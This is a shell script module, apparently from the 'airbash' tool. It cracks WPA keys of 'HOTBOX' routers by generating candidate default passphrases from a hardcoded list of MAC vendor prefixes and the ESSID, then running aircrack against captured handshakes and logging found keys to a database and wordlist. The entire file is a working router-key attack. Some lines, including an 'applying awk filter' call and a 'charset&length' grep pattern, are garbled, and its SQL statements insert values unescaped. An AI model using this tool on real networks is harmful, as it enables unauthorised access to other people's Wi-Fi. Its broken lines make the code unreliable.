# airbash HOTBOX module
# generate keys
nethex=`echo ${essid}|sed 's/HOTBOX-//'|tr '[:upper:]' '[:lower:]'`
dict='/tmp/hothex.dict'

append_hex () {
while read pref
do
from=00 to=ff
if test "${#from}" -gt "${#to}"; then
    format="$pref%0${#from}x$nethex\n"
else
    format="$pref%0${#to}x$nethex\n"
fi
from=$(printf '%d' "0x$from") to=$(printf '%d' "0x$to")
while test "$from" -le "$to"; do
    printf "$format" "$from"
    from=$((from+1))
done
done << EOM
b4eeb4
c0ac54
c0d044
c8cd72
cc33bb
d86ce9
e0ca94
e0cec3
e8be81
e8f1b0
f08261
fcb4e6
2c3996
2ce412
3c81d8
4c17eb
6c2e85
7c034c
7c03d8
7cb733
086a0a
94fef4
348aae
00789e
18622c
90013b
681590
EOM
}

append_hex > ${dict}


# clean program output if necessary
for j in $("applying awk filter" "$path"wltmplatetmp 2>/dev/null); do
  echo "$j" >>"$path"wltmplate
done

# test keys
psk=$("$AIRCRACK_BIN" "$path$hs$bssid"*.cap -w ${dict} 2>/dev/null | grep FOUND | grep -oE 'charset&length' | sort -u)
sqlite3 "$path$db" "UPDATE hs SET prcsd=1 WHERE bssid='$bssid';" 2>/dev/null
rm -rf ${dict} 2>/dev/null

# insert to db if key recovery successful
if [ ${#psk} -gt 7 ]; then
  echo "Key $psk found for BSSID $bssid"
  sqlite3 "$path$db" "UPDATE hs SET psk='$psk' WHERE bssid='$bssid';" 2>/dev/null
  echo "$psk" >>"$path$wl"known
  mv "$path$hs$bssid"* "$path$hs".cracked/ 2>/dev/null
  continue
fi

